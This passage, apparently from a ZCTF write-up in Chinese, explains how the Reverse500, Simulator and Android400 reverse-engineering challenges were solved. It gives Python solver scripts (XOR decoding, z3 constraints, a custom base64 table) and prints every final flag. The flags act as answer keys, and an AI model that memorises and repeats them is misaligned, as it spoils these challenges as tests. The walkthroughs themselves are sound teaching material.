m = [[21.0, 8.0, 24.0, 7.0, 1.0], [25.0, 4.0, 20.0, 16.0, 0.0],
     [2.0, 13.0, 16.0, 10.0, 14.0], [18.0, 3.0, 20.0, 18.0, 25.0], [3.0, 12.0, 23.0, 0.0, 24.0]]
flag_lists = [[1219.0, 1274.0, 1158.0, 1549.0, 1205.0], [2777.0, 2771.0, 2387.0, 3440.0, 2833.0],
              [1422.0, 1753.0, 1723.0, 2369.0, 1483.0], [2071.0, 2283.0, 1936.0, 3483.0, 2435.0]]
for flag in flag_lists:
    result3 = mat(m)**-1 * mat(flag).T
print result3
sbs = '''
   22.0000
   36.0000
   13.0000
   20.0000
   17.0000
   39.0000
   45.0000
   56.0000
   31.0000
   37.0000
   21.0000
   47.0000
    8.0000
   55.0000
   28.0000
   51.0000
   26.0000
   22.0000
   29.0000
   61.0000
'''
res2 = []
for sb in sbs.strip().split('n'):
    res2.append(int(sb.split('.')[0]))
for res in res2:
    print hex(res), hex(res&amp;0x3f)
from zio import *
flag = ''
for i in range(len(res2)/4):
    result = (res2[i*4]&lt;&lt;18)+(res2[i*4+1]&lt;&lt;12)+(res2[i*4+2]&lt;&lt;6)+res2[i*4+3]
    flag += l32(result)[0:3][::-1]
print flag
```



解得flag为: ZCTF`{`x~Uo#w3ig`}`

Reverse500

创建了一个子进程,首先对主进程对输入的数据进行了变换,变换后放到004079D8处,然后子进程再进行判断。

父进程中变换的函数使用一堆jmp进行了混淆。

通过记录程序运行的eip,然后再进行分析,分析发现就是个base64解密,然后挨着的两两字符异或,得到buff2。

在子进程中,将buff2[i]^i与固定字符串比较。



```
f = open('./reverse500.exe', 'rb')
d = f.read()[0x506c:0x506c+54]
result = ''
for i in range(53):
    result += chr(ord(d[i])^i)
result2 = ''
result2 += result[0]
for i in range(52):
    result2 += chr(ord(result2[i])^ord(result[i+1]))
print result2
print base64.b64decode('WkNURntJX1c0TlRfSm1QX2pNcF8mJl9CNFMxXzY0X0BeX15AIX0=')
```



得到flag为:ZCTF`{`I_W4NT_JmP_jMp_&amp;&amp;_B4S1_64_@^_^@!`}`

Simulator

实现了一个简单的虚拟机(或者叫模拟器)。

定位到虚拟机初始化的地方:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d189da0c04f1e861.png)

通过之后的分析,可以猜出vreg、vpc、vsp、vflag和vmem。

之后一共支持24条指令:



```
0  initvm
1  mov regi, imm  a1!=0
mov regi, regj  a1=0
2: a1 == 0: mov regi, byte [regj] 
a1 == 1: mov regi, word [regj] 
a1 == 2: mov regi, dword [regj] 
3: a1 == 0: mov byte [regj], regi
a1 == 1: mov word [regj], regi
a1 == 2: mov dword [regj], regi
4.  pop regi
5.  push regi
6.  a1 == 0: print regi #c
a1 == 1: print regi #d
a1 == 2: print regi #x
a1 == 3: print vmem[regi]
7.  a1 == 0: scanf regi #c
a1 == 1: scanf regi #d
a1 == 2: scanf regi #x
a1 == 3: scanf vmem[regi]
8.  ret
9.  a1 == 0  jmp imm
a1 == 1: jz imm
a1 == 2  jnz imm
a1 == 3: jl imm
10. a1 == 0:  jmp regi
a1 == 1: jz regi
a1 == 2  jnz regi
a1 == 3: jl regi
11. a1 != 0:  add regi, imm
a1 == 0: add regi, regj
12. sub
13. and
14. or
15. xor
16. cmp
17. exit
18. a1 == 0: mov regi, byte mem[regj] 
a1 == 1:mov regi, word mem[regj] 
a1 == 2:mov regi, dword mem[regj] 
19. a1 == 0: mov byte mem[regj], regi 
a1 == 1:mov word mem[regj], regi 
a1 == 2:mov dword mem[regj], regi 
20. a1 != 0:call imm 
a1 == 0:call regi
21 nop
22  inc regi
23  dec regi
24  test regi, regj
```

根据逆向出来的指令格式,去反汇编分析input.bin。

程序逐字节累加,然后比较。



```
adds = [68, 116, 211, 300, 411, 529, 624, 673, 706, 813, 864, 959, 1014, 1086, 1137, 1232, 1285, 1390, 1499, 1616]
value = 0
result = ''
for add in adds:
    result += chr(add-value)
    value = add
print 'result:'+result
```

求得结果为D0_Yov_1!k3_7H3_5imu

最后6个字节的比较麻烦一些,直接用z3求解了。



```
from z3 import *
r10 = Real('r10')
r11 = Real('r11')
r12 = Real('r12')
r13 = Real('r13')
r14 = Real('r14')
r15 = Real('r15')
s = Solver()
s.add(r10 + r11 == 0x65)
s.add(r12 + r13 == 0x109-0x65)
s.add(r14 + r15 == 0x1ba-0x109)
s.add(r11 + r13 + r15 == 0xa3)
s.add(r10 + r12 == 0x148-0xa3)
s.add(r11 + r12 == 0xa8)
print(s.check())
print(s.model())
```

最终flag为: zctf`{`D0_Yov_1!k3_7H3_5imu14t0r?`}`

<br>

Android400

本apk为2048的游戏修改版,玩到一定的分数就会弹出输入flag的窗口,flag窗口的activity为Secret,该类会载入Auth这个lib

[![](https://p0.ssl.qhimg.com/t016ad1df58af2dd81b.png)](https://p0.ssl.qhimg.com/t016ad1df58af2dd81b.png)

观察其create函数,重点看最后一行setOnClickListener,其绑定的按钮监听器为i

[![](https://p5.ssl.qhimg.com/t018a7a9c35720dc6ad.png)](https://p5.ssl.qhimg.com/t018a7a9c35720dc6ad.png)

跟进类i的onClick函数,其中下面这段语句干了很多事。j.b函数取得了该apk的签名存到v1,重点看最后一行this.a.a的调用。

[![](https://p4.ssl.qhimg.com/t01880cdf815d86524e.png)](https://p4.ssl.qhimg.com/t01880cdf815d86524e.png)

this.a.a函数实际调用Secret.a函数,该函数中主要的语句是下面这条。

[![](https://p3.ssl.qhimg.com/t01cfec54e4c5dc1ebd.png)](https://p3.ssl.qhimg.com/t01cfec54e4c5dc1ebd.png)

其中Secret.a函数取得assets目录下的libListerner文件的内容,h.a函数将libListerner文件的内容用之前取得的签名作为密钥进行des解密,h.b函数将解密后的内容写入/data/data/com.zctf.zctf2048/libListener,也就是说这里如果想自己重新编译apk的话会比较麻烦。

随后程序调用h.a运行libListerner

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014266806305586a13.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ffe02f5ed2b8adf9.png)

随后程序会调用本地函数进行进一步处理。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0187f092b0752b2bf2.png)

用ida打开libAuth.so,跟进到程序Java_com_zctf_zctf2048_Auth_AskForAnswer调用的地方。其取得了传入的字符串后调用了sendAndAsk函数

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c58ca163a7a95824.png)

跟进查看,发现程序尝试连接本机的8000端口(转成小端为8000),

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0163585a89ba1f429e.png)

并进行tea加密。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015fb62cf3fc7a021c.png)

最后传输过去

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e4c5d313b7b684ae.png)

可以推测libListerner会监听8000端口,做进一步处理

用ida打开liblistener之后,定位到main函数,发现不是很复杂,就直接静态看了。

首先进行了tea算法,然后进行了变形base64,然后做了一个简单的变换。

在解密的过程中,发现变形base64解密完成之后,就已经得到flag了,(tea解密都不用算)。



```
table = [87, 12, 4294967283L, 4294967291L, 4294967282L, 15, 4294967262L, 68, 4294967293L, 4294967253L, 27, 4294967274L, 13, 4294967287L, 26, 11, 4294967229L, 36, 4294967268L, 58, 0, 4294967236L, 64, 4294967233L, 57, 4294967239L, 17, 2, 11, 4294967293L, 23, 4294967247L]
def sub_8c20(a1, a2):
    v2 = 87
    if a2:
        v2 = 65
        if a2 &lt;= 31:
            v2 = (a1 + table[a2])&amp;0xff
    return v2
v6 = 65
result = ''
for i in range(32):
    v6 = sub_8c20(v6, i)
    result += chr(v6)
print result
str2 = "GHgSTU45IMNesVlZadrXf17qBCJkxYWhijOyzbcR6tDPw023KLA8QEFuvmnop9+/"
import base64
def get_index(ch):
    for i in range(len(str2)):
        if str2[i] == ch:
            return i
    raise Exception('error')
flag = ''
from zio import *
for i in range(len(result)/4):
    d1 = get_index(result[4*i])
    d2 = get_index(result[4*i+1])
    d3 = get_index(result[4*i+2])
    d4 = get_index(result[4*i+3])
    d = (d1&lt;&lt;18)+(d2&lt;&lt;12)+(d3&lt;&lt;6)+d4
    flag += l32(d)[0:3][::-1]
print flag
```

最终flag为zctf`{`i_d0N()T_L1k3_2048`}`
